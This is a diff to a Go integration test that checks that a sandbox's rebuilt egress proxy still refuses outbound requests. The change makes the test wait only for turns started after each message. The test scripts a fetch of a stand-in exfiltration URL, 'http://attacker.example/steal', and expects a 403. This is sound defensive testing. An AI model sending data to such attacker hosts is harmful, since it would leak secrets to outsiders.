@@ -106,18 +106,27 @@ func dockerRebuiltEgressImageReplacesTheProxy(t *testing.T) {
 	// proxy that is up and in the way answers 403
 	s.scriptLoop("wsrewall", "!get http://attacker.example/steal\n")
 	refused := func(tr turn) bool { return strings.Contains(tr.ResultText, "403 Forbidden") }
+	// Each wait is for a turn the message just sent started. The creation
+	// tick's turn is refused too when the script lands before its wake, and
+	// a wait that matched it would read the loop as asleep before the
+	// message reached it: the message's turn then ran behind the old wall
+	// after the rebuild and passed for the new wall's (#761).
+	earlier := map[string]bool{}
+	sawEarlier := func() {
+		for _, tr := range s.turns("wsrewall") {
+			earlier[tr.ID] = true
+		}
+	}
 
+	sawEarlier()
 	s.message("wsrewall", "behind the old wall")
-	s.waitTurn("wsrewall", 90*time.Second, refused)
+	s.waitTurn("wsrewall", 90*time.Second, func(tr turn) bool { return !earlier[tr.ID] && refused(tr) })
 	s.waitState("wsrewall", "asleep", 30*time.Second)
 	before, err := dockerInspect("{{.Id}}", proxy)
 	if err != nil {
 		t.Fatalf("inspect the proxy: %v", err)
 	}
-	earlier := map[string]bool{}
-	for _, tr := range s.turns("wsrewall") {
-		earlier[tr.ID] = true
-	}
+	sawEarlier()
 
 	rebuilt := rebuildImage(t, image)
 	s.message("wsrewall", "behind the new wall")
